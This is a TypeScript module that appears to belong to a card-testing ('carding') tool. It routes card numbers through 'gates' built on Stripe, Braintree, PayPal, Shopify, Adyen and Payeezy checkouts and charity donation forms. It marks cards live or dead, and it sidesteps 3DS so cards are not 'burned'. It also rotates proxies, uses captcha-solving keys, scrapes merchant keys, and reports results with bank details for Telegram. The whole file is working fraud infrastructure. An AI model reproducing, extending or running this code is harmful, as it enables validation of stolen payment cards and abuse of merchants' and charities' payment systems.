import {
  checkCardStripe, checkCardStripeCharge, checkCardStripeCharitable,
  checkCardStripeGiveWP, checkCardStripeGravityForms, checkCardBraintree,
  checkCardStripeCheckoutSession, checkCardStripePageConfirm,
  checkCardStripeWpFullStripe,
  parseCardInput, parseCardInputDetailed, lookupBin, type GateExtras,
} from "./stripe-checker";
import { checkCardStripeAdminAjax, type AdminAjaxExtras } from "./stripe-checker2";
import { type BraintreeExtras } from "./braintree-checker";
import { checkCardPayPal } from "./paypal-checker";
import { checkCardPayeezy } from "./payeezy-checker";
import { checkCardShopify, type ShopifyExtras } from "./shopify-checker";
import { checkCardAdyen } from "./adyen-checker";
import { vbvCheck, binThreeDsHeuristic, VBV_ENDPOINT } from "./vbv-checker";
import { storage } from "./storage";

export type GateCheckResult = { status: string; response: string; latency: number; rawSnippet?: string };

function buildExtras(s: Record<string, any>): GateExtras {
  return {
    donateAmount:     s.donateAmount,
    currency:         s.currency,
    wcNonce:          s.wcNonce,
    wcStoreNonce:     s.wcStoreNonce,
    ajaxNonce:        s.ajaxNonce,
    gfPiNonce:        s.gfPiNonce || s.gfPaymentIntentNonce,
    connectedAccount: s.stripeAccount || s.connectedAccount,
    billingName:      s.billingFirstName && s.billingLastName
                        ? `${s.billingFirstName} ${s.billingLastName}`
                        : undefined,
    billingEmail:     s.billingEmail,
    billingPhone:     s.billingPhone,
    billingAddress:   s.billingAddress,
    billingCity:      s.billingCity,
    billingState:     s.billingState,
    billingZip:       s.billingZip,
    billingCountry:   s.billingCountry,
    timeout:          s.timeout,
    platform:         s.platform,
    checkoutPath:     s.checkoutPath,
    shopPath:         s.shopPath,
    productId:        s.productId,
    wcPaySlug:        s.wcPaySlug,
    proxyCountry:     s.proxyCountry,
    donationType:     s.donationType,
    captchaProvider:  s.captchaProvider,
    captchaApiKey:    s.captchaApiKey,
    walletConfigId:   s.walletConfigId,
    rawCookies:       s.rawCookies,
    giveFormId:        s.giveFormId,
    giveFormIdPrefix:  s.giveFormIdPrefix,
    giveFormHash:      s.giveFormHash,
    charitableFormId:  s.charitableFormId,
    wpFsFormName:      s.wpFsFormName,
    wpfsCustomInputCount: typeof s.wpfsCustomInputCount === "number" ? s.wpfsCustomInputCount : (parseInt(s.wpfsCustomInputCount, 10) || undefined),
    ajaxUrl:           s.ajaxUrl,
    liveOverrides:    Array.isArray(s.liveOverrides) ? s.liveOverrides
                       : (typeof s.liveOverrides === "string"
                          ? s.liveOverrides.split(",").map((x: string) => x.trim()).filter(Boolean)
                          : undefined),
    deadOverrides:    Array.isArray(s.deadOverrides) ? s.deadOverrides
                       : (typeof s.deadOverrides === "string"
                          ? s.deadOverrides.split(",").map((x: string) => x.trim()).filter(Boolean)
                          : undefined),
    proxyOverride:    s.proxyOverride,
  };
}

/** Apply per-gate classification overrides to a check result. */
function applyOverrides(result: GateCheckResult, extras: GateExtras): GateCheckResult {
  const text = result.response.toLowerCase();
  // Live wins over dead — if the admin marked a phrase as live for their bank,
  // we never want to downgrade it via a deadOverride that may have been left
  // over from another gate type.
  for (const kw of (extras.liveOverrides || [])) {
    if (kw && text.includes(kw.toLowerCase())) {
      return { ...result, status: "approved" };
    }
  }
  for (const kw of (extras.deadOverrides || [])) {
    if (kw && text.includes(kw.toLowerCase())) {
      return { ...result, status: "declined" };
    }
  }
  return result;
}

/**
 * Run a card against a gate config object.
 * @param enrichBin - if true, appends bank name from BIN lookup to response
 */
export async function runGateCheck(
  cardStr: string,
  gate: any,
  enrichBin = false,
): Promise<GateCheckResult> {
  // Wall-clock start for this whole check. Used as a latency fallback: several
  // individual checker return paths set latency:0 and never overwrite it, which
  // made the Telegram "Time:" line read "0ms". Measuring here guarantees every
  // result carries a real elapsed time even when the inner checker forgot.
  const _checkStart = Date.now();
  const parsedAttempt = parseCardInputDetailed(cardStr);
  if ("reason" in parsedAttempt) {
    return { status: "error", response: `Invalid format: ${parsedAttempt.reason}`, latency: Date.now() - _checkStart };
  }
  const parsed = parsedAttempt;

  const gs      = (gate?.settings as Record<string, any>) || {};
  // Defensive backstop for gates saved before settings.siteUrl was kept in
  // sync with the top-level url column — without this, every site-dependent
  // flow (WC, Braintree, Payeezy, BigCommerce…) silently degrades to token-only.
  if (!gs.siteUrl && gate?.url) gs.siteUrl = gate.url;
  const gateType = gate?.gateType || "stripe";
  const gateName = gate?.name || "Default";
  const subType  = gate?.subType || "payment_intents";
  const extras   = buildExtras(gs);

  // BIN blacklist — comma-separated prefixes (6-digit BINs or shorter ranges).
  // If the card's BIN starts with any entry, reject before hitting the gateway.
  // Ref: blockbin.txt logic from Python reference bots.
  if (gs.binBlacklist) {
    const bin6 = parsed.number.slice(0, 6);
    const prefixes = String(gs.binBlacklist).split(",").map((s: string) => s.trim()).filter(Boolean);
    const blocked = prefixes.find(p => bin6.startsWith(p));
    if (blocked) {
      return { status: "error", response: `BIN ${bin6} blacklisted (prefix: ${blocked})`, latency: Date.now() - _checkStart };
    }
  }

  // VBV / 3DS pre-check (opt-in per gate). Two independent signals:
  //   • External endpoint — only if the operator configured a working VBV
  //     service (per-gate vbvEndpoint or env VBV_CHECK_ENDPOINT). A "Declined"
  //     verdict short-circuits the gate (saves 15–25s, avoids an extra auth
  //     that would burn the card). The old hardcoded IP is dead, so this path
  //     is disabled unless a URL is set.
  //   • BIN 3DS heuristic — built-in fallback when no endpoint is configured.
  //     Infers 3DS likelihood from the issuer country (SCA/PSD2). Routing hint
  //     only: it never auto-skips, because a BIN can't truthfully say a card is
  //     declined.
  // Any inconclusive result just lets the gate run as normal.
  let vbvTag = "";
  if (gs.vbvPreCheck) {
    const hasEndpoint = !!(gs.vbvEndpoint || VBV_ENDPOINT);
    if (hasEndpoint) {
      const vbv = await vbvCheck(
        `${parsed.number}|${parsed.month}|${parsed.year}|${parsed.cvv}`,
        { endpoint: gs.vbvEndpoint, timeout: extras.timeout },
      );
      const skipDeclined = gs.vbvSkipDeclined ?? true;
      if (vbv.status === "declined" && skipDeclined) {
        return {
          status: "declined",
          response: `DECLINED ✗ 3DS pre-check: ${vbv.response} | gate skipped | ${gateName}`,
          latency: vbv.latency,
        };
      }
      if (vbv.status !== "error") vbvTag = ` | 🔐 3DS:${vbv.status}`;
    } else {
      // No external service — use the zero-dependency BIN heuristic for a hint.
      const binInfo = await lookupBin(parsed.number);
      const { likelihood } = binThreeDsHeuristic(binInfo);
      if (likelihood === "likely_3ds") {
        // Routing: if this gate is flagged as non-3DS-capable (can't complete an
        // OTP challenge), skip likely-3DS cards instead of burning an auth
        // attempt that would only come back requires_action. Operator opts in
        // per gate via settings.vbvSkip3dsBin. Default off — the heuristic is a
        // country guess, so we never skip unless explicitly told to.
        if (gs.vbvSkip3dsBin) {
          return {
            status: "declined",
            response: `DECLINED ✗ 3DS routing: likely-3DS BIN skipped (non-3DS gate) | ${gateName}`,
            latency: 0,
          };
        }
        vbvTag = " | 🔐 3DS?:likely";
      } else if (likelihood === "likely_frictionless") {
        vbvTag = " | 🔐 3DS?:unlikely";
      }
    }
  }

  let raw: any = null;

  // ── Stripe — explicit subtype routing (no silent fallbacks) ──────────────
  if (gateType === "stripe") {
    if (subType === "charitable" && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripeCharitable(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, gs.donatePath, extras);
    } else if ((subType === "givewp" || subType === "givewp_v3") && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripeGiveWP(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, gs.giveFormId, extras);
    } else if (subType === "wp_full_stripe" && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripeWpFullStripe(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, gs.donatePath, extras);
    } else if (subType === "gravityforms" && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripeGravityForms(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, gs.gfFormId, gs.gfPiNonce || gs.gfPaymentIntentNonce, extras);
    } else if (subType === "stripe_page_confirm" && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripePageConfirm(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, extras);
    } else if (subType === "checkout_session" && gs.publicKey && gs.siteUrl) {
      raw = await checkCardStripeCheckoutSession(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl, extras);
    } else if (gs.ajaxAction && gs.publicKey) {
      // py/json-imported gates: use the captured admin-ajax action + classification keywords
      const ajaxExtras: AdminAjaxExtras = {
        ajaxAction:        gs.ajaxAction,
        paymentMode:       gs.paymentMode,
        giveFormId:        gs.giveFormId,
        gfFormId:          gs.gfFormId,
        chargeAmount:      gs.chargeAmount,
        donateAmount:      gs.donateAmount,
        donatePath:        gs.donatePath,
        billingFirstName:  gs.billingFirstName  || extras.billingName?.split(" ")[0],
        billingLastName:   gs.billingLastName   || extras.billingName?.split(" ").slice(1).join(" "),
        billingEmail:      gs.billingEmail      || extras.billingEmail,
        billingAddress:    gs.billingAddress    || extras.billingAddress,
        billingCity:       gs.billingCity       || extras.billingCity,
        billingState:      gs.billingState      || extras.billingState,
        billingZip:        gs.billingZip        || extras.billingZip,
        billingCountry:    gs.billingCountry    || extras.billingCountry,
        liveOverrides:     extras.liveOverrides,
        deadOverrides:     extras.deadOverrides,
        connectedAccount:  extras.connectedAccount,
        proxyOverride:     extras.proxyOverride,
        proxyCountry:      extras.proxyCountry,
        timeout:           extras.timeout,
        rawCookies:        extras.rawCookies,
      };
      raw = await checkCardStripeAdminAjax(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey, gateName, gs.siteUrl || "", ajaxExtras);
    } else if (subType === "charges" || subType === "payment_intents" || subType === "auth") {
      raw = await checkCardStripeCharge(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey || "", gateName, gs.siteUrl, extras);
    } else if (subType === "standard" && gs.siteUrl) {
      raw = await checkCardStripeCharge(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey || "", gateName, gs.siteUrl, extras);
    } else if (subType === "wc_stripe_confirm_setup_intent") {
      raw = await checkCardStripe(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey || "", gateName, gs.siteUrl);
    } else if (subType === "tokenize") {
      raw = await checkCardStripeCharge(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey || "", gateName, gs.siteUrl, extras);
    } else if (subType === "3d_secure") {
      raw = await checkCardStripeCharge(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.publicKey || "", gateName, gs.siteUrl, extras);
    } else {
      // Unknown subtype — do NOT silently fallback to a wrong flow
      return { status: "error", response: `Unknown Stripe subType "${subType}" for gate "${gateName}". Check gate config.`, latency: Date.now() - _checkStart };
    }
  } else if (gateType === "braintree" && gs.btClientToken) {
    const btExtras: BraintreeExtras = {
      btFlow:       subType === "graphql" ? "graphql" : subType === "drop_in" ? "drop_in" : subType === "bigcommerce_stencil" ? "bigcommerce_stencil" : gs.btFlow,
      btMerchantId: gs.btMerchantId,
      addPmPath:    gs.addPmPath,
    };
    raw = await checkCardBraintree(parsed.number, parsed.month, parsed.year, parsed.cvv, gs.btClientToken, gateName, gs.siteUrl, btExtras);
  } else if (gateType === "shopify" && gs.siteUrl) {
    const shopifyExtras: ShopifyExtras = {
      productHandle: gs.productHandle,
      checkoutScope: gs.checkoutScope,
      proxyOverride: extras.proxyOverride,
      proxyCountry:  extras.proxyCountry,
      timeout:       extras.timeout,
    };
    raw = await checkCardShopify(parsed.number, parsed.month, parsed.year, parsed.cvv, gateName, gs.siteUrl, shopifyExtras);
  } else if (gateType === "payeezy" && gs.siteUrl) {
    raw = await checkCardPayeezy(parsed.number, parsed.month, parsed.year, parsed.cvv, gateName, gs.siteUrl, gs.addPmPath);
  } else if (gateType === "paypal" && gs.siteUrl) {
    if (subType === "express" || subType === "advanced" || subType === "givewp_commerce" || subType === "paypal_commerce" || subType === "standard") {
      raw = await checkCardPayPal(parsed.number, parsed.month, parsed.year, parsed.cvv, gateName, gs.siteUrl);
    } else {
      return { status: "error", response: `Unknown PayPal subType "${subType}" for gate "${gateName}". Check gate config.`, latency: Date.now() - _checkStart };
    }
  } else if (gateType === "adyen" && gs.siteUrl) {
    if (subType === "standard" || subType === "drop_in" || subType === "components") {
      raw = await checkCardAdyen(parsed.number, parsed.month, parsed.year, parsed.cvv, gateName, gs.siteUrl, subType);
    } else {
      return { status: "error", response: `Unknown Adyen subType "${subType}" for gate "${gateName}". Check gate config.`, latency: Date.now() - _checkStart };
    }
  } else {
    // Unknown gate type — do NOT silently fallback
    return { status: "error", response: `Unknown gate type "${gateType}" for gate "${gateName}". Check gate config.`, latency: Date.now() - _checkStart };
  }

  if (!raw) return { status: "error", response: `No gate key configured (type: ${gateType}, subType: ${subType})`, latency: Date.now() - _checkStart };

  // Persist stable values discovered during the check (acct_, pk_live_, form
  // ids, donate path, etc.) — values the operator didn't have when they
  // configured the gate. Only writes when genuinely new — diffs against the
  // current settings to avoid pointless DB writes on every check. Session-
  // bound values (nonces/hashes) are NEVER saved here; they invalidate within
  // hours and a stale cache would cause "session expired" errors. Fire-and-
  // forget — a failed write must not block returning the result.
  if (raw.discoveredSettings && gate?.id) {
    const ds = raw.discoveredSettings;
    const updates: Record<string, any> = {};
    // CRITICAL: only fill EMPTY fields. Never overwrite a value the operator
    // deliberately set — they may have configured a different pk_live_ than
    // what the page shows (e.g. routed through a different Stripe account),
    // or pinned a specific form-id. A discovered scrape value is "I saw this
    // on the page just now"; the operator's value is "I want this used"
    // and that always wins.
    const isEmpty = (v: any) => v === undefined || v === null || v === "";
    // Each comparison is field-specific because the runtime field name (in
    // discoveredSettings) doesn't always match the gate-settings field name
    // (e.g. acct_ → either connectedAccount or stripeAccount on legacy gates).
    if (ds.connectedAccount  && isEmpty(gs.connectedAccount) && isEmpty(gs.stripeAccount)) updates.connectedAccount = ds.connectedAccount;
    if (ds.publicKey         && isEmpty(gs.publicKey))         updates.publicKey         = ds.publicKey;
    if (ds.giveFormId        && isEmpty(gs.giveFormId))        updates.giveFormId        = ds.giveFormId;
    if (ds.giveFormIdPrefix  && isEmpty(gs.giveFormIdPrefix))  updates.giveFormIdPrefix  = ds.giveFormIdPrefix;
    if (ds.gfFormId          && isEmpty(gs.gfFormId))          updates.gfFormId          = ds.gfFormId;
    if (ds.charitableFormId  && isEmpty(gs.charitableFormId))  updates.charitableFormId  = ds.charitableFormId;
    if (ds.wpFsFormName      && isEmpty(gs.wpFsFormName))      updates.wpFsFormName      = ds.wpFsFormName;
    if (ds.donatePath        && isEmpty(gs.donatePath))        updates.donatePath        = ds.donatePath;
    if (ds.ajaxAction        && isEmpty(gs.ajaxAction))        updates.ajaxAction        = ds.ajaxAction;
    if (ds.ajaxUrl           && isEmpty(gs.ajaxUrl))           updates.ajaxUrl           = ds.ajaxUrl;
    if (ds.btMerchantId      && isEmpty(gs.btMerchantId))      updates.btMerchantId      = ds.btMerchantId;
    if (ds.productId         && isEmpty(gs.productId))         updates.productId         = ds.productId;
    if (Object.keys(updates).length > 0) {
      const mergedSettings = { ...gs, ...updates };
      storage.updateGateConfig(gate.id, { settings: mergedSettings } as any).catch((err: any) => {
        console.error(`[checker] failed to persist discoveredSettings for gate ${gate.id}: ${err?.message ?? err}`);
      });
    }
  }

  let response = raw.response as string;
  // Universal amount tag — every gate gets a "| $X.XX" segment so the
  // dashboard + telegram surfaces have a consistent rich layout. Sources
  // checked in order (first match wins):
  //   1. WC PI auto-discovery already inserted via annotateAmount()
  //   2. settings.chargeAmount  (explicit per-gate override)
  //   3. settings.donateAmount  (donation/charitable/GiveWP/GravityForms)
  //   4. settings.amount        (generic alias used by some gate configs)
  //   5. "0.50" fallback for Stripe Auth setup_intent flows — these
  //      verify-only checks don't actually charge, but $0.50 is the Stripe
  //      minimum and signals "verification only" to admins.
  if (!/\| \$\d/.test(response)) {
    const validAmt = (v: any) => v && /^\d+(\.\d{1,2})?$/.test(String(v).trim()) ? String(v).trim() : "";
    let derivedAmt = validAmt(gs.chargeAmount) || validAmt(gs.donateAmount) || validAmt(gs.amount);
    let amtNote = "";
    if (!derivedAmt && (subType === "auth" || subType === "wc_stripe_confirm_setup_intent" || /seti_/.test(response))) {
      derivedAmt = "0.50";
      amtNote = " verify";
    }
    if (derivedAmt) {
      const tokenIdx = response.search(/ \| (ch_|tok_|pm_|pi_|seti_|src_)/);
      const insert = ` | $${derivedAmt}${amtNote}`;
      response = tokenIdx === -1 ? response + insert : response.slice(0, tokenIdx) + insert + response.slice(tokenIdx);
    }
  }
  if (enrichBin) {
    const binInfo = await lookupBin(parsed.number);
    if (binInfo?.bank && !response.includes(binInfo.bank)) {
      // Compose a single "Bank: NAME (LEVEL) 🇺🇸" segment so the telegram
      // formatter can render it as one line instead of multiple unknowns.
      const flagStr = binInfo.flag ? ` ${binInfo.flag}` : "";
      const levelStr = binInfo.level ? ` (${binInfo.level})` : "";
      response += ` | 🏦 ${binInfo.bank}${levelStr}${flagStr}`;
    } else if (!binInfo?.bank) {
      // BIN lookup failed — still emit the tag with a placeholder so the
      // telegram parser doesn't fall back to claiming some random segment
      // as the bank name. Better to say "unknown" than mislabel.
      response += ` | 🏦 BIN ${parsed.number.slice(0, 6)} (unresolved)`;
    }
  }

  // Proxy disposition — admins want to know whether the check used a sticky
  // proxy, the rotating pool, or went direct. Doesn't track the exact IP that
  // was used (that's decided per-request inside the checker pool) but tells
  // the operator which routing policy applied to this gate.
  const proxyTag = gs.proxyOverride
    ? `sticky:${(gs.proxyOverride as string).replace(/^https?:\/\//, "").split("@").pop()}`
    : gs.proxyCountry
      ? `pool:${String(gs.proxyCountry).toUpperCase()}`
      : "pool";
  if (!response.includes("🛰")) {
    const tokenIdx = response.search(/ \| (ch_|tok_|pm_|pi_|seti_|src_)/);
    const insert = ` | 🛰 ${proxyTag}`;
    response = tokenIdx === -1 ? response + insert : response.slice(0, tokenIdx) + insert + response.slice(tokenIdx);
  }

  // VBV pre-check verdict (passed/otp) — append once so the operator sees the
  // 3DS disposition alongside the gate result. Declined verdicts already
  // short-circuited above, so vbvTag here is only "passed" or "otp".
  if (vbvTag && !response.includes("🔐")) response += vbvTag;

  const status = raw.status === "live" ? "approved"
               : raw.status === "dead" ? "declined"
               : "error";
  return applyOverrides({
    status,
    response,
    // Trust the inner checker's latency when it set one; otherwise fall back to
    // the wall-clock elapsed for this call so the Telegram "Time:" line is
    // never a misleading "0ms".
    latency: (typeof raw.latency === "number" && raw.latency > 0) ? raw.latency : (Date.now() - _checkStart),
    rawSnippet: raw.rawSnippet,
  }, extras);
}
